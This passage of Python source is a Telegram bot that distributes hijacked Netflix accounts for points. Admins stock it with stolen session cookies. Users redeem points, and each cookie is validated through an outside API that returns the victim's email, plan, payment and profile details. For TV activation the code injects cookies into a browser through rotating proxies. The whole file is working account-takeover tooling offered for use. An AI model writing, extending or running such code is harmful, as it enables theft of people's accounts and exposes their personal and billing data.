            f"🎁 *REDEEM YOUR POINTS*\n{'─'*28}\n\n💎 Balance: `{pts} pts`\n📦 Stock: `{cnt}`\n\nChoose device:",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown", reply_markup=kb,
        )
    except:
        pass
    bot.answer_callback_query(call.id, "")


@bot.callback_query_handler(func=lambda c: c.data.startswith("redeem:"))
def cb_redeem(call):
    parts  = call.data.split(":")
    device = parts[1]
    uid    = call.from_user.id
    if uid != int(parts[2]):
        bot.answer_callback_query(call.id, "⚠️ Not your session.", show_alert=False)
        return
    cfg  = DEVICES[device]
    cost = cfg["cost"]
    pts  = get_points(uid)
    if pts < cost:
        bot.answer_callback_query(call.id, f"❌ Need {cost} pts, you have {pts}.", show_alert=True)
        return
    if stock_count() == 0:
        bot.answer_callback_query(call.id, "😔 No stock right now.", show_alert=True)
        return
    bot.answer_callback_query(call.id, "⏳ Processing…")

    # ── Mobile / PC ──────────────────────────────────────────────────────────
    if device in ("mobile", "pc"):
        try:
            bot.edit_message_text(
                "⏳ *Fetching account…*",
                call.message.chat.id, call.message.message_id,
                parse_mode="Markdown",
            )
        except:
            pass

        api_s = requests.Session()
        api_s.mount("https://", requests.adapters.HTTPAdapter(pool_connections=5, pool_maxsize=10))

        def run():
            for attempt in range(1, 11):
                if stock_count() == 0:
                    safe_edit(
                        f"😔 *Stock ran out.* Points *not* deducted.\n\n💎 Balance: `{get_points(uid)} pts`",
                        call.message.chat.id, call.message.message_id,
                        parse_mode="Markdown", reply_markup=menu_kb(uid),
                    )
                    return
                cookie = pop_cookie()
                if not cookie:
                    break
                update_pin()
                print(f"[{device.upper()}] uid={uid} attempt={attempt}")
                try:
                    resp   = api_s.post(API_URL, json={"key": NFTOKEN_API_KEY, "cookie": cookie.strip()}, timeout=20)
                    data   = resp.json()
                    status = data.get("status")
                    if status == "SUCCESS":
                        rem  = deduct_points(uid, cost)
                        link = data.get("x_l1", "#")

                        kb = InlineKeyboardMarkup()
                        if link.startswith("http"):
                            if device == "mobile":
                                # Proxy URL: server-side login + forced desktop viewport
                                proxy_url = f"{get_public_url()}/go?url={quote(link, safe='')}"
                                kb.row(InlineKeyboardButton("📱 Mobile Login", url=proxy_url))
                            else:
                                # PC: direct link, Chrome on desktop handles it natively
                                kb.row(InlineKeyboardButton("🎬 Open Netflix (Desktop)", url=link))
                        kb.row(InlineKeyboardButton("🔙 BACK TO MENU", callback_data=f"back_menu:{uid}"))

                        safe_edit(
                            f"✅ *NETFLIX CLAIM SUCCESSFUL*\n{'═'*26}\n\n"
                            f"📧 *Email:*    `{data.get('x_mail','N/A')}`\n"
                            f"🎬 *Plan:*     `{data.get('x_tier','Unknown')}`\n"
                            f"🌍 *Country:*  `{data.get('x_loc','N/A')}`\n"
                            f"📅 *Renewal:*  `{data.get('x_ren','N/A')}`\n"
                            f"⏳ *Since:*    `{data.get('x_mem','N/A')}`\n"
                            f"💳 *Payment:*  `{data.get('x_bil','N/A')}`\n"
                            f"👥 *Profiles:* `{data.get('x_usr','N/A')}`\n\n"
                            f"{'═'*26}\n"
                            f"💎 Balance: `{rem} pts` | 📦 Stock: `{stock_count()}`\n\n"
                            f"_Tap 🎬 Open Netflix to watch in desktop mode._",
                            call.message.chat.id, call.message.message_id,
                            parse_mode="Markdown", reply_markup=kb,
                        )
                        return
                    else:
                        kill_cookie(cookie)
                        update_pin()
                        safe_edit(
                            f"🔄 *Checking… (attempt {attempt})*\n_Dead account, trying next…_",
                            call.message.chat.id, call.message.message_id,
                            parse_mode="Markdown",
                        )
                except Exception as e:
                    print(f"[{device.upper()}] API err: {e}")
                    push_cookie(cookie)
                    update_pin()
            safe_edit(
                f"😔 *No working accounts found.*\nPoints *not* deducted.\n\n💎 Balance: `{get_points(uid)} pts`",
                call.message.chat.id, call.message.message_id,
                parse_mode="Markdown", reply_markup=menu_kb(uid),
            )

        run_bg(run)
        return

    # ── TV ────────────────────────────────────────────────────────────────────
    if device == "tv":
        cookie = pop_cookie()
        if not cookie:
            safe_msg(call.message.chat.id, "😔 Stock just ran out.")
            return
        deduct_points(uid, cost)
        update_pin()
        _pending_tv[uid] = {"cookie": cookie, "cost": cost}
        try:
            bot.edit_message_text(
                f"📺 *TV Activation*\n{'─'*28}\n\n"
                f"💎 *3 pts deducted.* Balance: `{get_points(uid)} pts`\n\n"
                f"📟 Send the *8-digit code* shown on your Netflix TV screen:",
                call.message.chat.id, call.message.message_id,
                parse_mode="Markdown",
            )
        except:
            safe_msg(call.message.chat.id, "📺 Send the *8-digit code*:", parse_mode="Markdown")


@bot.message_handler(func=lambda m: m.from_user.id in _pending_tv and m.content_type == "text")
def handle_tv_code(msg):
    uid  = msg.from_user.id
    code = msg.text.strip()
    if not code.isdigit() or len(code) != 8:
        safe_send(bot.reply_to, msg, "⚠️ Send a valid *8-digit* code.", parse_mode="Markdown")
        return
    sess   = _pending_tv.pop(uid)
    cookie = sess["cookie"]
    smsg   = safe_send(bot.reply_to, msg, "🤖 Starting browser…")
    if not smsg:
        return

    def run():
        cur = cookie
        sc  = None
        for attempt in range(1, 4):
            sc    = None
            proxy = _next_proxy()
            try:
                safe_edit(
                    "🍪 Injecting cookies…" if attempt == 1 else f"🔄 Retry {attempt}/3…",
                    msg.chat.id, smsg.message_id,
                )
                ok, sc = tv_activate(cur, code, proxy)
                cap    = (
                    f"✅ *TV Activated!* Code `{code}` entered.\n💎 Balance: `{get_points(uid)} pts`"
                    if ok else
                    f"⚠️ Code field not found.\n💎 Balance: `{get_points(uid)} pts`"
                )
                try:
                    bot.delete_message(msg.chat.id, smsg.message_id)
                except:
                    pass
                with open(sc, "rb") as f:
                    safe_send(bot.send_photo, msg.chat.id, f, caption=cap, parse_mode="Markdown", reply_markup=menu_kb(uid))
                return
            except Exception as e:
                err = str(e).lower()
                if proxy and any(k in err for k in ("proxy", "connect", "timeout", "refused", "407", "ssl")):
                    _kill_proxy(proxy)
                if sc and os.path.exists(sc):
                    try:
                        os.unlink(sc)
                    except:
                        pass
                if attempt < 3:
                    kill_cookie(cur)
                    update_pin()
                    nxt = pop_cookie()
                    if nxt:
                        cur = nxt
                        update_pin()
                    else:
                        break
        add_points(uid, sess["cost"])
        safe_edit(
            f"😔 *Could not activate.* *{sess['cost']} pts refunded.*\n💎 Balance: `{get_points(uid)} pts`",
            msg.chat.id, smsg.message_id,
            parse_mode="Markdown", reply_markup=menu_kb(uid),
        )

    run_bg(run)


@bot.callback_query_handler(func=lambda c: c.data.startswith("invite_earn:"))
def cb_invite(call):
    uid  = call.from_user.id
    link = f"https://t.me/{get_bot_info().username}?start=ref_{uid}"
    kb   = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("🔙 Back", callback_data=f"back_menu:{uid}"))
    try:
        bot.edit_message_text(
            f"📊 *INVITE & EARN*\n{'─'*28}\n\n🤝 Referrals: `{get_refs(uid)}`\n"
            f"💎 Balance: `{get_points(uid)} pts`\n\n🔗 *Invite Link:*\n`{link}`\n\n"
            f"Each friend = *+1 pt*!",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown", reply_markup=kb,
        )
    except:
        pass
    bot.answer_callback_query(call.id, "")


@bot.callback_query_handler(func=lambda c: c.data.startswith("promocode:"))
def cb_promo(call):
    uid = call.from_user.id
    kb  = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("🔙 Back", callback_data=f"back_menu:{uid}"))
    try:
        bot.edit_message_text(
            f"🎟 *PROMOCODE*\n{'─'*28}\n\nSend: `/promo YOUR_CODE`",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown", reply_markup=kb,
        )
    except:
        pass
    bot.answer_callback_query(call.id, "")


@bot.callback_query_handler(func=lambda c: c.data.startswith("back_menu:"))
def cb_back(call):
    uid = call.from_user.id
    _pending_tv.pop(uid, None)
    try:
        bot.edit_message_text(menu_text(uid), call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=menu_kb(uid))
    except:
        safe_msg(call.message.chat.id, menu_text(uid), parse_mode="Markdown", reply_markup=menu_kb(uid))
    bot.answer_callback_query(call.id, "")


@bot.message_handler(commands=["promo"])
def cmd_promo(msg):
    uid   = msg.from_user.id
    parts = msg.text.strip().split()
    if len(parts) < 2:
        safe_send(bot.reply_to, msg, "Usage: `/promo CODE`", parse_mode="Markdown")
        return
    code = parts[1].upper()
    v    = get_promo(code)
    if v is None:
        safe_send(bot.reply_to, msg, "❌ Invalid promo code.")
        return
    if has_used_promo(uid, code):
        safe_send(bot.reply_to, msg, "⚠️ Already used.")
        return
    tot = add_points(uid, v)
    mark_promo(uid, code)
    safe_send(bot.reply_to, msg, f"✅ *+{v} pts!*\n💎 Balance: `{tot} pts`", parse_mode="Markdown")


@bot.channel_post_handler(func=lambda m: m.chat.id == STOCK_CHANNEL_ID and m.text)
def on_stock(msg):
    txt = msg.text.strip()
    if not txt.startswith("/") and _is_cookie(txt):
        push_cookie(txt, msg_id=msg.message_id)
        update_pin()
        print(f"[STOCK] Saved msg_id={msg.message_id} total={stock_count()}")


# ── Admin ─────────────────────────────────────────────────────────────────────
def admin_only(fn):
    def wrap(msg, *a, **kw):
        if msg.from_user.id not in ADMIN_IDS:
            safe_send(bot.reply_to, msg, "⛔ Admins only.")
            return
        return fn(msg, *a, **kw)
    wrap.__name__ = fn.__name__
    return wrap


@bot.message_handler(commands=["addcookie"])
@admin_only
def cmd_addcookie(msg):
    p = msg.text.split(None, 1)
    if len(p) < 2:
        safe_send(bot.reply_to, msg, "Usage: `/addcookie <cookie>`", parse_mode="Markdown")
        return
    push_cookie(p[1])
    update_pin()
    safe_send(bot.reply_to, msg, f"✅ Added. Stock: `{stock_count()}`", parse_mode="Markdown")


@bot.message_handler(commands=["addstock"])
@admin_only
def cmd_addstock(msg):
    p = msg.text.split(None, 1)
    if len(p) < 2:
        safe_send(bot.reply_to, msg, "Usage: `/addstock <blocks>`", parse_mode="Markdown")
        return
    blocks = [b.strip() for b in p[1].strip().split("\n\n") if b.strip()]
    added  = sum(1 for b in blocks if b and (push_cookie(b) or True))
    update_pin()
    safe_send(bot.reply_to, msg, f"✅ Added *{added}* cookie(s).\n📦 Stock: `{stock_count()}`", parse_mode="Markdown")


@bot.message_handler(commands=["stock"])
@admin_only
def cmd_stock(msg):
    safe_send(bot.reply_to, msg, f"📦 Stock: `{stock_count()}` cookie(s)", parse_mode="Markdown")


@bot.message_handler(commands=["clearstock"])
@admin_only
def cmd_clear(msg):
    with db() as c:
        c.execute("DELETE FROM stock")
        c.commit()
    update_pin()
    safe_send(bot.reply_to, msg, "🗑 Cleared. Stock: `0`", parse_mode="Markdown")


@bot.message_handler(commands=["addpoints"])
@admin_only
def cmd_addpts(msg):
    p = msg.text.strip().split()
    if len(p) != 3:
        safe_send(bot.reply_to, msg, "Usage: `/addpoints <uid> <n>`", parse_mode="Markdown")
        return
    try:
        tuid = int(p[1])
        n    = int(p[2])
    except:
        safe_send(bot.reply_to, msg, "❌ Bad args.")
        return
    tot = add_points(tuid, n)
    safe_send(bot.reply_to, msg, f"✅ `{n:+d} pts` → `{tuid}`\n💎 Balance: `{tot} pts`", parse_mode="Markdown")
    safe_msg(tuid, f"🎁 Admin adjusted: `{n:+d} pts`\n💎 Balance: `{tot} pts`", parse_mode="Markdown")


@bot.message_handler(commands=["createpromo"])
@admin_only
def cmd_mkpromo(msg):
    p = msg.text.strip().split()
    if len(p) != 3:
        safe_send(bot.reply_to, msg, "Usage: `/createpromo CODE pts`", parse_mode="Markdown")
        return
    try:
        code = p[1].upper()
        pts  = int(p[2])
    except:
        safe_send(bot.reply_to, msg, "❌ Bad args.")
        return
    if pts <= 0:
        safe_send(bot.reply_to, msg, "❌ pts > 0")
        return
    v = "Created" if create_promo(code, pts) else "Updated"
    safe_send(bot.reply_to, msg, f"✅ *{v}!* `{code}` → {pts} pts", parse_mode="Markdown")


@bot.message_handler(commands=["listpromos"])
@admin_only
def cmd_lspromos(msg):
    with db() as c:
        rows = c.execute("SELECT code,points FROM promo_codes ORDER BY code").fetchall()
    if not rows:
        safe_send(bot.reply_to, msg, "📭 No promos.")
        return
    safe_send(
        bot.reply_to, msg,
        f"🎟 *Promos ({len(rows)}):*\n\n" + "\n".join(f"`{c}` → {p} pts" for c, p in rows),
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["deletepromo"])
@admin_only
def cmd_delpromo(msg):
    p = msg.text.strip().split()
    if len(p) != 2:
        safe_send(bot.reply_to, msg, "Usage: `/deletepromo CODE`", parse_mode="Markdown")
        return
    code = p[1].upper()
    with db() as c:
        if not c.execute("SELECT 1 FROM promo_codes WHERE code=?", (code,)).fetchone():
            safe_send(bot.reply_to, msg, f"❌ `{code}` not found.", parse_mode="Markdown")
            return
        c.execute("DELETE FROM promo_codes WHERE code=?", (code,))
        c.commit()
    safe_send(bot.reply_to, msg, f"🗑 `{code}` deleted.", parse_mode="Markdown")


@bot.message_handler(commands=["seturl"])
@admin_only
def cmd_seturl(msg):
    p = msg.text.strip().split()
    if len(p) != 2:
        curr = get_public_url()
        safe_send(bot.reply_to, msg, f"Current URL: `{curr}`\n\nUsage: `/seturl https://your-new-url.com`", parse_mode="Markdown")
        return
    url = p[1]
    if set_public_url(url):
        safe_send(bot.reply_to, msg, f"✅ Public URL updated to:\n`{url}`", parse_mode="Markdown")
    else:
        safe_send(bot.reply_to, msg, "❌ Invalid URL. Must start with http/https.")


@bot.message_handler(content_types=["document"])
def handle_doc(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return
    doc  = msg.document
    name = doc.file_name or ""
    if not any(name.endswith(x) for x in (".txt", ".json", ".zip")):
        safe_send(bot.reply_to, msg, "⚠️ .txt / .json / .zip only")
        return
    st = safe_send(bot.reply_to, msg, "📂 Reading…")
    if not st:
        return
    try:
        raw = bot.download_file(bot.get_file(doc.file_id).file_path)
    except:
        safe_edit("🚨 Download failed.", msg.chat.id, st.message_id)
        return
    added = 0

    def proc(txt):
        nonlocal added
        for b in [x.strip() for x in txt.replace("|", "\n\n").split("\n\n") if x.strip()]:
            if _is_cookie(b):
                push_cookie(b)
                added += 1

    if name.endswith(".zip"):
        try:
            with zipfile.ZipFile(io.BytesIO(raw)) as zf:
                for e in zf.namelist():
                    if e.endswith((".txt", ".json")):
                        proc(zf.read(e).decode("utf-8", "ignore").strip())
        except Exception as e:
            safe_edit(f"🚨 ZIP error: {e}", msg.chat.id, st.message_id)
            return
    else:
        proc(raw.decode("utf-8", "ignore").strip())

    update_pin()
    safe_edit(
        f"✅ Added *{added}* cookie(s).\n📦 Stock: `{stock_count()}`",
        msg.chat.id, st.message_id,
        parse_mode="Markdown",
    )


@bot.message_handler(func=lambda m: True)
def fallback(msg):
    uid = msg.from_user.id
    bad = check_member(uid)
    if bad:
        safe_msg(
            msg.chat.id,
            "🚀 *PREMIUM ACCESS BOT*\n\nJoin all channels and click *Verify* to start.",
            parse_mode="Markdown",
            reply_markup=must_join_kb(bad),
        )
        return
    safe_msg(msg.chat.id, menu_text(uid), parse_mode="Markdown", reply_markup=menu_kb(uid))


# ── Chat member (referral penalty) ───────────────────────────────────────────
def _is_mj(chat):
    return any(
        str(chat.id) in ch["id"] or ch["id"].lstrip("@") == (chat.username or "")
        for ch in MUST_JOIN_CHANNELS
    )

@bot.chat_member_handler()
def on_member(upd: telebot.types.ChatMemberUpdated):
    if not _is_mj(upd.chat):
        return
    old = upd.old_chat_member.status
    new = upd.new_chat_member.status
    uid = upd.new_chat_member.user.id
    ch  = str(upd.chat.id)
    LEFT   = {"left", "kicked", "banned"}
    JOINED = {"member", "administrator", "creator", "restricted"}
    if old in JOINED and new in LEFT:
        ref = get_referrer(uid)
        if not ref or has_penalty(ref, uid, ch):
            return
        add_penalty(ref, uid, ch)
        pts = deduct_points(ref, 1)
        safe_msg(
            ref,
            f"⚠️ *Referral Penalty!*\nA referred user left a channel.\n➖ `1 pt`\n💎 Balance: `{pts} pts`",
            parse_mode="Markdown",
        )
    elif old in LEFT and new in JOINED:
        ref = get_referrer(uid)
        if ref:
            remove_penalty(ref, uid, ch)


# ==========================================
# ENTRY POINT
# ==========================================
if __name__ == "__main__":
    init_db()
    print(f"[PROXY] {len(_PROXY_LIST)} TV proxies loaded.")
    threading.Thread(target=run_flask, daemon=True).start()
    print("[FLASK] Running on :8080")
    print("🤖 Bot started.")
    bot.infinity_polling(
        allowed_updates=["message", "callback_query", "channel_post", "chat_member"],
        timeout=30,
        long_polling_timeout=20,
        logger_level=logging.ERROR,
    )